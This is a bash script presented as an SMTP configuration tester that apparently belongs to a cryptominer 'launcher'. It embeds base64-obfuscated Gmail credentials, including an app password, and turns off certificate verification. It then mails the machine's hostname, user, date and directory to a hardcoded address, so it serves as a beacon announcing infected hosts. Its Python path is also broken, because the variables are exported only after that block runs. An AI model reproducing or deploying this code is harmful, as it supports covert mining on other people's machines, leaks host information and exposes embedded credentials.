#!/bin/bash
# ============================================================
# SMTP Mail Configuration Tester
# Fast & Simple - No Cleanup, No Installation
# ============================================================

echo "=========================================="
echo "SMTP MAIL CONFIGURATION TESTER"
echo "=========================================="
echo ""

# ==================== SMTP CREDENTIALS ====================
# ⚠️ USER-SPECIFIC SMTP CREDENTIALS - GMAIL WITH APP PASSWORD ⚠️
SMTP_SERVER_B64="c210cC5nbWFpbC5jb20="
SMTP_PORT=587
SENDER_EMAIL_B64="YWNlbmJlcmdoZWltQGdtYWlsLmNvbQ=="
SMTP_PASSWORD_B64="amZ2diBjZGxsIGlvb2Mga3F4ZA=="
RECIPIENT_EMAIL="acenbergheim@googlemail.com"

# Decode credentials
SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null)
SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null)

if [ -z "$SMTP_SERVER" ] || [ -z "$SENDER_EMAIL" ] || [ -z "$SMTP_PASSWORD" ]; then
    echo "[✗] ERROR: Could not decode base64 credentials!"
    echo "    Make sure base64 command is available"
    exit 1
fi

# Display configuration
echo "[*] Mail Configuration:"
echo "    SMTP Server: $SMTP_SERVER"
echo "    SMTP Port: $SMTP_PORT"
echo "    From: $SENDER_EMAIL"
echo "    To: $RECIPIENT_EMAIL"
echo ""

# Create test email content
TEST_EMAIL_CONTENT=$(cat <<EOF
TEST EMAIL FROM MINER LAUNCHER

This is a test email to verify your SMTP configuration is working correctly.

Hostname: $(hostname 2>/dev/null || echo 'N/A')
User: $(whoami)
Date: $(date)
Current Directory: $(pwd)

If you received this email, your configuration is working!
EOF
)

# Create temp file
TEST_TEMP_FILE=$(mktemp)
echo "$TEST_EMAIL_CONTENT" > "$TEST_TEMP_FILE"

echo "[*] Sending test email..."
echo ""

# Try Python first
if command -v python3 >/dev/null 2>&1; then
    echo "[*] Method 1: Python3..."
    python3 << 'PYTHON_EOF'
import sys
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

try:
    SMTP_SERVER = os.getenv('SMTP_SERVER')
    SMTP_PORT = int(os.getenv('SMTP_PORT'))
    SENDER_EMAIL = os.getenv('SENDER_EMAIL')
    SMTP_PASSWORD = os.getenv('SMTP_PASSWORD')
    RECIPIENT_EMAIL = os.getenv('RECIPIENT_EMAIL')
    TEST_TEMP_FILE = os.getenv('TEST_TEMP_FILE')
    
    with open(TEST_TEMP_FILE, 'r', encoding='utf-8') as f:
        body = f.read()

    msg = MIMEMultipart()
    msg['From'] = SENDER_EMAIL
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = 'TEST: Miner Launcher Mail Config'
    msg.attach(MIMEText(body, 'plain'))

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10) as server:
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(SENDER_EMAIL, SMTP_PASSWORD)
        server.send_message(msg)
    
    print('[✓] TEST EMAIL SENT SUCCESSFULLY!')
    sys.exit(0)
except Exception as e:
    print(f'[✗] Python Error: {str(e)}', file=sys.stderr)
    sys.exit(1)
PYTHON_EOF

    PYTHON_EXIT=$?
    if [ $PYTHON_EXIT -eq 0 ]; then
        echo "[✓] Email sent via Python!"
        rm -f "$TEST_TEMP_FILE"
        echo ""
        echo "=========================================="
        echo "[✓] Mail configuration is WORKING!"
        echo "=========================================="
        exit 0
    else
        echo "[✗] Python method failed"
        echo ""
    fi
fi

# Export for Python script
export SMTP_SERVER
export SMTP_PORT
export SENDER_EMAIL
export SMTP_PASSWORD
export RECIPIENT_EMAIL
export TEST_TEMP_FILE

# Try curl
if command -v curl >/dev/null 2>&1; then
    echo "[*] Method 2: curl..."
    
    if curl -s --ssl-reqd \
        --url "smtp://$SMTP_SERVER:$SMTP_PORT" \
        --user "$SENDER_EMAIL:$SMTP_PASSWORD" \
        --mail-from "$SENDER_EMAIL" \
        --mail-rcpt "$RECIPIENT_EMAIL" \
        --upload-file "$TEST_TEMP_FILE" >/dev/null 2>&1; then
        echo "[✓] TEST EMAIL SENT SUCCESSFULLY!"
        rm -f "$TEST_TEMP_FILE"
        echo ""
        echo "=========================================="
        echo "[✓] Mail configuration is WORKING!"
        echo "=========================================="
        exit 0
    else
        echo "[✗] curl method failed"
        echo ""
    fi
fi

# All methods failed
rm -f "$TEST_TEMP_FILE"
echo ""
echo "=========================================="
echo "[✗] ERROR: All email methods FAILED!"
echo "=========================================="
echo ""
echo "🔍 TROUBLESHOOTING:"
echo ""
echo "  ❌ Python3 not available:"
echo "     - Install Python3: sudo apt install python3 (Debian/Ubuntu)"
echo "     -                  sudo yum install python3 (RedHat/CentOS)"
echo ""
echo "  ❌ SMTP Authentication Failed:"
echo "     - Check Gmail account has App Password enabled"
echo "     - Go to: myaccount.google.com → Security → App passwords"
echo "     - Create a new app password for Email"
echo "     - Update SMTP_PASSWORD_B64 in this script"
echo ""
echo "  ❌ Connection Refused (port 587):"
echo "     - Check firewall allows outgoing SMTP"
echo "     - Try: telnet $SMTP_SERVER $SMTP_PORT"
echo ""
echo "  ❌ Certificate/SSL Errors:"
echo "     - Script disables certificate checking"
echo "     - Network connectivity issue? Try: ping 8.8.8.8"
echo ""
echo "  ❌ Base64 Decode Failed:"
echo "     - Install base64: usually pre-installed"
echo "     - Check: echo 'aGk=' | base64 -d  (should output: 'hi')"
echo ""

exit 1
